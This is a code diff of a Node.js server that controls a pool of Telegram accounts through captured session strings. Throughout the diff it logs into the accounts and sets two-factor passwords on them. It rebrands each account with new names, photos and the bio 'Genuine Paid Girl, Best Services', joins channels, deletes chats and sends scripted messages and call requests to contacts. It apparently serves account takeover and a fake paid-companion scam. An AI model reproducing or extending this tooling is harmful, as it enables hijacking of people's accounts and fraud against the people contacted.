@@ -60,7 +60,10 @@ fetchWithTimeout('https://ipinfo.io/json')
       }, 100);
     })
   }
-  ).catch(err => console.error(err))
+).catch(err => {
+  console.error(err)
+  joinchannelForBufferClients();
+})
 
 let count = 0;
 let botCount = 0
@@ -115,11 +118,12 @@ try {
         if (now.getUTCDate() % 3 === 1) {
           await fetchWithTimeout(`${value.url}leavechannels`);
         }
-        fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
       } catch (error) {
         console.log("Some Error: ", error.code);
       }
+      await sleep(3000)
     }
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
     await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
   })
   schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
@@ -224,11 +228,18 @@ app.get('/setupClient/:clientId', async (req, res, next) => {
   next();
 }, async (req, res) => {
   if (Date.now() > (settingupClient + 240000)) {
+    await disconnectAll();
+    await sleep(1000)
     settingupClient = Date.now();
     const clientId = req.params?.clientId;
     const archieveOld = req?.query?.a;
+    const days = req?.query?.d;
+    const mobile = req?.query?.m;
+    const formalities = req?.query?.f;
+    const PLimited = !!req.query.PLimited;
     console.log(clientId, archieveOld);
-    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false)
+    await fetchWithTimeout(`${ppplbot()}&text=Received NEw Client Request for - ${clientId}`);
+    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false, days, mobile, formalities?.toLowerCase() === 'no' ? false : true, PLimited)
   } else {
     console.log("Profile Setup Recently tried");
   }
@@ -238,14 +249,10 @@ app.get('/updateClient/:clientId', async (req, res, next) => {
   res.send('Hello World!');
   next();
 }, async (req, res) => {
-  if (Date.now() > (settingupClient + 240000)) {
-    settingupClient = Date.now();
-    const clientId = req.params?.clientId;
-    console.log(clientId);
-    await updateClient(clientId.toString())
-  } else {
-    console.log("Profile Setup Recently tried");
-  }
+  settingupClient = Date.now();
+  const clientId = req.params?.clientId;
+  console.log(clientId);
+  await updateClient(clientId.toString())
 })
 
 app.get('/getip', (req, res) => {
@@ -262,6 +269,7 @@ app.post('/users', async (req, res, next) => {
   const cli = getClient(user.mobile);
   const activeClientSetup = getActiveClientSetup()
   if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
+    user['lastUpdated'] = new Date().toISOString().split('T')[0]
     await db.insertUser(user);
     await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
   } else {
@@ -808,20 +816,26 @@ app.get('/setpp/:number/:name', async (req, res, next) => {
 });
 
 
-app.get('/SetAsBufferClient/:number', async (req, res, next) => {
+app.get('/updateclientasdeleted/:number', async (req, res, next) => {
   res.send("Updating Name");
   next();
 }, async (req, res) => {
   try {
     const number = req.params?.number;
     const db = ChannelService.getInstance();
-    const user = await db.getUser({ mobile: number });
+    let user = await db.getUser({ mobile: number });
+    if (!user) {
+      user = await db.getInAchivedClient({ number: `+${number}` });
+      user['mobile'] = user.number
+    }
     console.log(user);
-    if (!hasClient(user.mobile)) {
+    if (user && !hasClient(user.mobile)) {
       const cli = await createClient(user.mobile, user.session);
       const client = await getClient(user.mobile);
       if (cli) {
-        await client.set2fa();
+        if (!(await client.hasPassword())) {
+          await client.set2fa();
+        }
         await sleep(30000)
         await client.updateUsername();
         await sleep(5000)
@@ -912,6 +926,30 @@ app.get('/UpdatePP/:number', async (req, res, next) => {
   }
 });
 
+app.get('/deleteChat/:number/:chatId', async (req, res, next) => {
+  res.send("dleteing chat");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const chatId = req.params?.chatId;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.deleteChat(chatId);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
 
 app.get('/UpdateName/:number', async (req, res, next) => {
   res.send("Updating Name");
@@ -955,6 +993,19 @@ app.get('/deletepp/:number', async (req, res, next) => {
         console.log("Client Does not exist!")
       }
     }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/rmbuffer/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    await db.deleteBufferClient({ mobile: number })
   } catch (error) {
     console.log("Some Error: ", error)
   }
@@ -1126,7 +1177,7 @@ app.get('/receiveNumber/:num', async (req, res, next) => {
     const num = parseInt(req.params.num);
     const data = userMap.get(userName.toLowerCase());
     if (data) {
-      await axios.get(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
+      await fetchWithTimeout(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
     }
   } catch (error) {
     console.log("Some Error: ", error.code);
@@ -1146,7 +1197,7 @@ app.get('/tgclientoff/:num', async (req, res, next) => {
       const data = userMap.get(userName.toLowerCase());
       const url = data?.url;
       if (url) {
-        const connectResp = await axios.get(`${url}getprocessid`, { timeout: 10000 });
+        const connectResp = await fetchWithTimeout(`${url}getprocessid`, { timeout: 10000 });
         if (connectResp.data.ProcessId === processId) {
           userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
           pushToconnectionQueue(userName, processId)
@@ -1217,14 +1268,14 @@ app.get('/requestcall', async (req, res, next) => {
     if (user) {
       setTimeout(async () => {
         try {
-          const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
+          const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
           if (data.data) {
             console.log(`Call Request Sent: ${userName} | ${chatId}`)
             setTimeout(async () => {
               try {
-                const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
+                const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
                 setTimeout(async () => {
-                  await axios.get(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
+                  await fetchWithTimeout(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
                 }, 3 * 60 * 1000);
               } catch (error) {
                 console.log(error)
@@ -1253,7 +1304,7 @@ app.listen(port, async () => {
 class checkerclass {
   static instance = undefined;
 
-  constructor() {
+  constructor () {
     this.main();
   };
 
@@ -1275,21 +1326,21 @@ class checkerclass {
     if (url) {
       userMap.set(userName, { ...data, timeStamp: Date.now() });
       try {
-        //await axios.get(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
-        //await axios.get(`${ url } `, { timeout: 10000 });
+        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
+        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });
         try {
           console.log('Checking Health')
-          const resp = await axios.get(`${url} checkHealth`, { timeout: 10000 });
+          const resp = await fetchWithTimeout(`${url} checkHealth`, { timeout: 10000 });
           if (resp.status === 200 || resp.status === 201) {
             if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
               console.log(resp.data.userName, ': All good');
             } else {
               console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
-              await axios.get(`${ppplbot()}& text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${resp.data.status} `);
+              await fetchWithTimeout(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:HealthCheckError-${resp.data.status}`);
               try {
-                const connectResp = await axios.get(`${url} tryToConnect / ${processId} `, { timeout: 10000 });
+                const connectResp = await fetchWithTimeout(`${url}tryToConnect/${processId}`, { timeout: 10000 });
                 console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
-                await axios.get(`${ppplbot()}& text=${(connectResp.data.userName).toUpperCase()}: RetryResponse - ${connectResp.data.status} `);
+                await fetchWithTimeout(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:RetryResponse-${connectResp.data.status}`);
               } catch (e) {
                 console.log(url, `CONNECTION RESTART FAILED!!`);
               }
@@ -1472,7 +1523,6 @@ async function checkBufferClients() {
       console.log(document.mobile, " :  false");
       badIds.push(document.mobile);
       await db.deleteBufferClient(document)
-      await db.deleteUser(document);
     }
   }
   console.log(badIds, goodIds);
@@ -1505,6 +1555,7 @@ async function addNewUserstoBufferClients() {
             await client.deleteProfilePhotos();
             await sleep(5000)
             console.log("Inserting Document");
+            document['date'] = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
             await db.insertInBufferClients(document);
             await client.disconnect();
             await deleteClient(document.mobile)
@@ -1515,7 +1566,7 @@ async function addNewUserstoBufferClients() {
             await deleteClient(document.mobile)
           }
         } else {
-          await db.deleteUser(document);
+          // await db.deleteUser(document);
         }
       } else {
         console.log("Cursor Does not have Next");
@@ -1533,6 +1584,8 @@ async function addNewUserstoBufferClients() {
 async function updateClient(clientId) {
   try {
     const db = await ChannelService.getInstance();
+    await disconnectAll();
+    await sleep(2000);
     const oldClient = await db.getUserConfig({ clientId })
     if (oldClient) {
       try {
@@ -1541,22 +1594,22 @@ async function updateClient(clientId) {
           const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);
           if (cli) {
             const client = await getClient(oldClientUser.mobile);
-            const username = (clientId.match(/[a-zA-Z]+/g)).toString();
-            await CloudinaryService.getInstance(username);
-            const userCaps = username[0].toUpperCase() + username.slice(1)
-            await client.updateUsername(`${userCaps}Redd`);
-            await sleep(5000)
+            await CloudinaryService.getInstance(oldClient?.dbcoll?.toLowerCase());
+            // const userCaps = username[0].toUpperCase() + username.slice(1)
+            // await client.updateUsername(`${userCaps}Redd`);
+            await sleep(2000)
+            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
+            await sleep(3000)
             await client.deleteProfilePhotos();
             await sleep(3000)
             await client.updatePrivacy();
             await sleep(3000)
             await client.updateProfilePic('./dp1.jpg');
-            await sleep(1000);
+            await sleep(3000);
             await client.updateProfilePic('./dp2.jpg');
-            await sleep(1000);
+            await sleep(3000);
             await client.updateProfilePic('./dp3.jpg');
-            await sleep(1000);
-            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
+            await sleep(2000);
           }
         }
       } catch (error) {
@@ -1567,7 +1620,7 @@ async function updateClient(clientId) {
 
   }
 }
-async function setUpClient(clientId, archieveOld) {
+async function setUpClient(clientId, archieveOld, days = 0, mobile = null, formalities = true, pLimited = false) {
   try {
     const db = await ChannelService.getInstance();
     const oldClient = await db.getUserConfig({ clientId })
@@ -1582,54 +1635,69 @@ async function setUpClient(clientId, archieveOld) {
             // await oldClienttg.updateProfile("Deleted Account", `New ACC https://${oldClient.link}`);
             // await sleep(5000)
             await oldClienttg.deleteProfilePhotos();
-            await sleep(5000)
+            await sleep(3000)
             await oldClienttg.updatePrivacyforDeletedAccount();
+            await sleep(2000)
+            await oldClienttg.updateUsername()
           }
         }
-        delete oldClientUser["_id"]
-        await db.insertInBufferClients({ ...oldClientUser })
+        delete oldClientUser["_id"];
+        if (!pLimited) {
+          oldClientUser['date'] = (new Date(Date.now() + (days * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+          await db.insertInBufferClients({ ...oldClientUser })
+        }
       } catch (error) {
         console.log("Error updateing settings of old Client - ", error);
+        await fetchWithTimeout(`${ppplbot()}&text=Error updateing settings of old Client - ${clientId}`);
       }
       delete oldClient['_id']
       oldClient['insertedDate'] = new Date().toISOString().split('T')[0]
+      oldClient['pLimited'] = pLimited
       await db.insertInAchivedClient(oldClient);
+      await fetchWithTimeout(`${ppplbot()}&text=Archived Old Client ${clientId}`);
       console.log("Archived old client");
     }
 
-    const newClient = await db.getOneBufferClient();
+    const newClient = await db.getOneBufferClient(mobile);
+
     await deleteClient(newClient.mobile)
     await sleep(2000);
     if (newClient) {
       const cli = await createClient(newClient.mobile, newClient.session, false);
       if (cli) {
         const client = await getClient(newClient.mobile);
-        const username = (clientId.match(/[a-zA-Z]+/g)).toString();
-        await CloudinaryService.getInstance(username);
-        const userCaps = username[0].toUpperCase() + username.slice(1);
+        let newUsername
         setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });
-        const newUsername = await client.updateUsername(`${userCaps}Redd`);
-        oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
-        await sleep(3000)
-        await client.deleteProfilePhotos();
-        await sleep(3000)
-        await client.updatePrivacy();
-        await sleep(3000)
-        await client.updateProfilePic('./dp1.jpg');
-        await sleep(1000);
-        await client.updateProfilePic('./dp2.jpg');
-        await sleep(1000);
-        await client.updateProfilePic('./dp3.jpg');
-        await sleep(1000);
-        await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
-        await sleep(3000)
+        if (formalities) {
+          const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
+          const userCaps = username[0].toUpperCase() + username.slice(1);
+          newUsername = await client.updateUsername(`${userCaps}Redd`);
+          if (archieveOld && oldClienttg) {
+            oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
+          }
+        }
+        await sleep(2000)
         const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });
         if (existingData) {
-          await setNewClient(existingData, clientId);
+          await fetchWithTimeout(`${ppplbot()}&text=Setting UP from archives - ${clientId}-${newUsername}-${newClient.mobile}`);
+          console.log("Data Existing already");
+          await setNewClient({ ...existingData, userName: newUsername }, { clientId });
+          await db.removeOneAchivedClient({ number: `+${newClient.mobile}` });
         } else {
-          await generateNewSession(newClient.mobile)
+          await fetchWithTimeout(`${ppplbot()}&text=Generating new Session -  ${clientId}-${newUsername}-${newClient.mobile}`);
+          await generateNewSession(newClient.mobile);
+          setTimeout(async () => {
+            const stillExists = await db.getOneBufferClient(newClient.mobile);
+            if (stillExists) {
+              console.log("Removeing buff client as failed to update")
+              stillExists['date'] = (new Date(Date.now() + (30 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+              await db.insertInBufferClients({ ...stillExists })
+            }
+          }, 150000);
         }
       }
+    } else {
+      console.log("New client does not exist")
     }
   } catch (error) {
     console.log(error)
@@ -1638,47 +1706,62 @@ async function setUpClient(clientId, archieveOld) {
 async function generateNewSession(phoneNumber) {
   try {
     console.log("String Generation started");
-    await sleep(2000);
-    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${phoneNumber}`);
-    console.log("Code Sent successfully")
+    await sleep(1000);
+    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
+    if (response) {
+      console.log(`Code Sent successfully-${response}`);
+      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
+    } else {
+      await sleep(5000);
+      await generateNewSession(phoneNumber);
+    }
   } catch (error) {
     console.log(error)
   }
 }
 async function setNewClient(user, activeClientSetup) {
   try {
+    console.log("Setting data for:", user, activeClientSetup)
+    const clientId = activeClientSetup.clientId;
     const db = await ChannelService.getInstance();
     let mainAccount = user.userName?.replace("@", '')
-    if (fetchNumbersFromString(activeClientSetup.clientId) == "2") {
-      const mainUser = await db.getUserConfig({ clientId: activeClientSetup.clientId.replace("2", "1") });
+    if (fetchNumbersFromString(clientId) == "2") {
+      const mainUser = await db.getUserConfig({ clientId: clientId.replace("2", "1") });
       mainAccount = mainUser.userName;
     } else {
-      const client2 = activeClientSetup.clientId.replace("1", "2")
+      const client2 = clientId.replace("1", "2")
       const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });
       if (data) {
         console.log(client2, " -  ", data)
         console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
-        if (data.repl) {
-          try {
-            await axios.get(`${data?.repl}/exit`);
-          } catch (error) {
+        // if (data.userName) {
+        //   try {
+        //     await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${data.userName}`);
+        //   } catch (error) {
 
-          }
-        }
+        //   }
+        // }
       }
     }
     const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
     console.log("Updated the Client Successfully", updatedClient);
     await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/forward/updateclient/${clientId}`);
+    await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
     console.log(activeClientSetup.clientId, " -  ", updatedClient)
-    if (updatedClient?.repl) {
+    if (updatedClient?.userName) {
       try {
-        await axios.get(`${updatedClient?.repl}/exit`)
+        await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${updatedClient.userName}`);
       } catch (error) {
         console.log(error);
       }
     }
-    await setUserMap()
+    await setUserMap();
+    try {
+      await fetchWithTimeout(`https://uptimechecker.onrender.com/refreshmap`);
+    } catch (error) {
+      console.log(error);
+    }
   } catch (error) {
     console.log(error);;
   }
@@ -1699,7 +1782,7 @@ async function joinchannelForBufferClients() {
   const db = ChannelService.getInstance();
   await disconnectAll();
   await sleep(2000);
-  const clients = await db.readBufferClients({ channels: { "$lt": 150 } }, 4)
+  const clients = await db.readBufferClients({ channels: { "$lt": 180 } }, 4)
   for (const document of clients) {
     const cli = await createClient(document.mobile, document.session, false);
     if (cli) {
